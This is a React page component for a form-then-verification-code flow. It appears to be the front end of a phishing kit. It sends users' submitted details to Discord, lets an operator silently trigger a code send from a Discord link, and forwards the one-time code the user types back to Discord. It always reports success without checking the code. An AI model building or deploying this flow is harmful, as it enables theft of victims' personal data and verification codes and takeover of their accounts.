import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";
import VerificationSuccess from "@/components/VerificationSuccess";
import ResultScreen from "@/components/ResultScreen";

export default function Home() {
  const getParams = () => new URLSearchParams(window.location.search);

  const getInitialStep = () => {
    const p = getParams();
    if (p.get("result") === "valid") return "verified";
    if (p.get("result") === "wrong") return "wrong";
    if (p.get("result") === "expired") return "expired";
    if (p.get("step") === "code") return "code";
    return "form";
  };

  const [step, setStep] = useState(getInitialStep);
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(null);
  const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
  const pollingRef = useRef(null);

  // Handle ?trigger=ID from Discord link — silently update status in background
  useEffect(() => {
    const triggerId = getParams().get("trigger");
    if (triggerId) {
      base44.functions.invoke("sendCode", { submissionId: triggerId }).catch(() => {});
    }
  }, []);

  // Poll every 3s when on "validation" step
  useEffect(() => {
    if (step === "validation" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        if (res?.data?.status === "code_ready") {
          clearInterval(pollingRef.current);
          setStep("code");
        }
      }, 3000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  const handleSubmit = async (data) => {
    setLoading(true);
    const record = await base44.entities.Submission.create(data);
    await base44.functions.invoke("notifyDiscord", { ...data, submissionId: record.id }).catch(() => {});
    setSubmittedData(data);
    setSubmissionId(record.id);
    setStep("validation");
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    await base44.functions.invoke("notifyCodeEntered", {
      ...submittedData,
      code,
      submissionId,
    }).catch(() => {});
    setStep("verified");
    setLoading(false);
  };

  const handleBack = () => {
    window.location.href = "/";
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-12">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none" />

      <div className="relative z-10 w-full max-w-md">
        {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
        {step === "validation" && <SuccessScreen data={submittedData} />}
        {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
        {step === "verified"   && <VerificationSuccess data={submittedData} />}
        {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
        {step === "expired"    && <ResultScreen type="expired" onBack={handleBack} />}
      </div>
    </div>
  );
}